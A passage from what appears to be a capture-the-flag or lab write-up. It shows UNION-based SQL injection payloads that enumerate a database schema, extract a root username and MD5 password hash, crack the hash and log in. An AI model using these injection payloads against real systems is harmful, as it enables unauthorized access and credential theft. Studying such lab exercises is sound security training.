because of this sqli we can also find some credentials like :

?page=member
with "1 AND 1=2 UNION SELECT table_schema,table_name FROM information_schema.columns" and "1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns" we know table schema "Member_Brute_Force" for table_name "db_default", and columns "username" and "password".

Search for : 1 UNION SELECT username,password from Member_Brute_Force.db_default

[...]
ID: 1 UNION SELECT username,password from Member_Brute_Force.db_default
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
[...]

3bf1114a986ba87ed28fc1b5884fc2f8 (md5 decrypt) => shadow

index.php?page=signin
Login with username "root" and password "shadow"

